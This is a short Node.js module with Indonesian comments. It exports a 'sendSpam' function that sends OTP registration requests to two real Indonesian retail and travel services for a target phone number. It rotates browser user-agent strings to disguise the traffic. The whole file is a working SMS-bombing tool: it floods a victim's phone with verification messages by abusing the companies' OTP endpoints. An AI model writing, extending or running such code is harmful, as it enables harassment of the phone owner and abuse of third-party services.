const axios = require('axios')

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
  // Tambahkan user-agent lainnya di sini
];

const sendSpam = async (phoneNumber) => {
  const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
  try {
    // Mengirim permintaan ke API pertama
    await axios.post("https://wapi.ruparupa.com/auth/generate-otp", {
      phone: "0" + phoneNumber,
      action: "register",
      channel: "message",
      email: "",
      token: "",
      customer_id: "0",
      is_resend: 0
    }, {
      headers: {
        "User-Agent": userAgent,
        "Authorization": "Bearer TOKEN_HERE", // Masukkan token otorisasi yang sesuai
        "Content-Type": "application/json",
        // Tambahkan header lain yang diperlukan
      }
    });

    await axios.post("https://m.misteraladin.com/api/members/v2/otp/request", {
      phone_number_country_code: "62",
      phone_number: phoneNumber,
      type: "register"
    }, {
      headers: {
        "User-Agent": userAgent,
        "Content-Type": "application/json",
      }
    });

    console.log(`Sukses spam ke nomor: ${phoneNumber}`);
  } catch (error) {
    console.error(`Gagal spam ke nomor: ${phoneNumber}`, error.message);
    return error;
  }
};

module.exports = { sendSpam };
